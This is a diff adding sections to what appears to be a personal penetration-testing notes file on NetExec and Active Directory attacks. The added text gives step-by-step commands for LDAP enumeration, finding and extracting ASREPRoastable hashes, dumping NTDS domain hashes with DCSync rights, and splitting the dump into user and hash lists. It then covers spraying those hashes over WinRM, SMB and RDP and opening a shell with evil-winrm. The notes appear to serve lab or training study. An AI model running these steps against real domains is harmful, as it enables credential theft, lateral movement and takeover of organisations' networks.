@@ -173,8 +173,110 @@ Useful after pivoting into an internal network — test creds against everything
 
 ---
 
+## LDAP — Active Directory Enumeration
+
+```bash
+nxc ldap <DC_IP> -u <user> -p <pass> --users
+nxc ldap <DC_IP> -u <user> -p <pass> --groups
+nxc ldap <DC_IP> -u <user> -p <pass> --pass-pol
+nxc ldap <DC_IP> -u <user> -p <pass> --admin-count
+```
+
+---
+
+## ASREPRoasting via LDAP
+
+### Find Vulnerable Accounts (no password needed)
+
+Test a username list — Kerberos will confirm which accounts exist and which are ASREPRoastable:
+
+```bash
+nxc ldap <DC_IP> -u users.txt -p "" -k
+```
+
+- `KDC_ERR_C_PRINCIPAL_UNKNOWN` → username does not exist
+- `[+] account vulnerable to asreproast attack` → pre-auth disabled, hash extractable
+
+> Requires domain name in `/etc/hosts` before running.
+
+### Extract the AS-REP Hash
+
+```bash
+nxc ldap <DC_IP> -u <username> -p "" --asreproast output.txt
+```
+
+Hash format: `$krb5asrep$23$...` → crack with Hashcat `-m 18200`.
+
+---
+
+## NTDS Dump (Domain Hash Extraction)
+
+Requires credentials for an account with DCSync rights:
+
+```bash
+nxc smb <DC_IP> -u <user> -p '<password>' --ntds
+```
+
+> Use single quotes when password contains `!` — double quotes cause bash to misparse it.
+
+Output format: `user:RID:LM_hash:NT_hash:::`
+The NT hash (4th field) is what you use for Pass-the-Hash.
+
+---
+
+## Pass-the-Hash — Bulk Testing After NTDS Dump
+
+After dumping NTDS you have multiple users and hashes. The efficient path is to split them into two line-matched files and spray them against whatever service was open on nmap (WinRM 5985, SMB 445, RDP 3389).
+
+### Step 1 — Split Into Separate Files
+
+NTDS output format: `domain\user:RID:LM_hash:NT_hash:::`
+
+```bash
+# Usernames only — strips domain prefix, leaving plain username
+awk -F: '{gsub(/.*\\/, "", $1); print $1}' dump.ntds > users.txt
+
+# NT hashes only — field 4
+cut -d':' -f4 dump.ntds > hashes.txt
+```
+
+Both files are line-matched: line 1 of `users.txt` pairs with line 1 of `hashes.txt`.
+
+### Step 2 — Spray With --no-bruteforce
+
+`--no-bruteforce` pairs by line number (user1:hash1, user2:hash2).
+Without it, nxc tries every user against every hash — pointless here.
+
+```bash
+# WinRM
+nxc winrm <IP> -u users.txt -H hashes.txt --no-bruteforce
+
+# SMB (if WinRM not open)
+nxc smb <IP> -u users.txt -H hashes.txt --no-bruteforce
+
+# RDP
+nxc rdp <IP> -u users.txt -H hashes.txt --no-bruteforce
+```
+
+Look for `[+]` (valid auth) and `(Pwn3d!)` (shell access).
+
+### Step 3 — Drop Into Shell With evil-winrm
+
+Once nxc identifies which account hits, take that specific user and hash to evil-winrm:
+
+```bash
+evil-winrm -u <user> -H <NT_hash> -i <IP>
+```
+
+> evil-winrm is your interactive shell — nxc is the sprayer that tells you which account to use.
+> `-H` takes the NT hash only. Do not pass the LM hash (`aad3b435b51404eeaad3b435b51404ee`) — it always fails.
+
+---
+
 ## Related Notes
 
+- [[Active_Directory_Attacks]]
+- [[AD_Username_Generation]]
 - [[Password_Spraying]]
 - [[Impacket]]
 - [[Hashcat]]
